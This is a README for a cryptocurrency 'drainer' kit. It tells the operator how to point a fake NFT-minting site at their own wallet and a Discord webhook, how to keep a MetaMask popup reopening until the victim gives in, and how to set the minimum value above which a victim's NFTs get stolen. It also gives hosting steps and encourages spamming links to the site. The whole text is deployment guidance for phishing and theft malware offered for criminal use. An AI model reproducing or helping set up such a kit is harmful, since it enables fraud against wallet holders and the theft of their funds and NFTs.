## `‚úèÔ∏è Guidelines on Setting Up the Drainer:` 
you need to edit the **configs.js**.
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your wallet address (metamask is the best one).**
- line 2: const Webhook = `"Webhook";` replace this by **your discord webhook**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
  


## `üöÄ Deploy`

**1- Navigate to the directory where you downloaded the script.**<br>
**2- Host the website by placing all the files in a web server of your choice.**<br>
**3- Launch the hosted website in a web browser.**<br>

## `üëª Important : `

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
### **the more you spam, the more you earn**
### ‚û¢ To see the metamask popup, you must host the website
